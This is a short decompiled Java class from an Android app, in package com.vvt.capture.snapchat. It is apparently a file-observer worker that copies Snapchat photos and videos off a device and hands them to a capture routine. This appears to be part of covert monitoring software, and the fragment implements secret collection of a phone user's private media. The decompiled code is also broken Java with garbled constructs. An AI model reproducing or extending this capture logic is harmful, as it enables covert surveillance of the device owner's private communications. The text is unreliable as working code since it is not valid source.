package com.vvt.capture.snapchat.a;

import com.vvt.capture.snapchat.d;
import com.vvt.io.p;
import java.io.File;

class g
  implements Runnable
{
  g(f paramf, String paramString) {}
  
  public void run()
  {
    try
    {
      localObject1 = this.b;
      localObject1 = f.a((f)localObject1);
      String str = this.a;
      str = p.a((String)localObject1, str);
      localObject1 = this.b;
      Object localObject3 = new java/io/File;
      ((File)localObject3).<init>(str);
      f.a((f)localObject1, (File)localObject3);
      localObject1 = this.b;
      localObject1 = f.b((f)localObject1);
      int i = ((File)localObject1).exists();
      if (i != 0)
      {
        i = 0;
        localObject1 = null;
        localObject3 = this.b;
        localObject3 = f.a((f)localObject3);
        Object localObject4 = "video";
        boolean bool2 = ((String)localObject3).endsWith((String)localObject4);
        if (bool2) {
          i = 1;
        }
        localObject3 = this.b;
        localObject3 = ((f)localObject3).a;
        localObject3 = a.e((a)localObject3);
        localObject1 = com.vvt.capture.snapchat.b.a((String)localObject3, i);
        localObject3 = this.a;
        localObject1 = p.a((String)localObject1, (String)localObject3);
        localObject3 = this.b;
        localObject3 = ((f)localObject3).a;
        localObject3 = a.e((a)localObject3);
        localObject4 = this.b;
        localObject4 = ((f)localObject4).a;
        localObject4 = a.f((a)localObject4);
        localObject4 = ((com.vvt.base.b)localObject4).f();
        Object localObject5 = this.b;
        localObject5 = ((f)localObject5).a;
        localObject5 = a.f((a)localObject5);
        localObject5 = ((com.vvt.base.b)localObject5).g();
        d.a(str, (String)localObject1, (String)localObject3, (String)localObject4, (String)localObject5);
        bool1 = a.d();
        if (!bool1) {}
      }
      localObject1 = this.b;
    }
    catch (Exception localException)
    {
      for (;;)
      {
        Object localObject1;
        boolean bool1 = a.c();
        if (bool1) {}
        f localf = this.b;
      }
    }
    finally
    {
      f.a(this.b, null);
    }
    f.a((f)localObject1, null);
  }
}


/* Location:              /Volumes/D1/codebase/android/POC/assets/product/maind/classes-enjarify.jar!/com/vvt/capture/snapchat/a/FxFileObserverWorker.class
 * Java compiler version: 5 (49.0)
 * JD-Core Version:       0.7.1
 */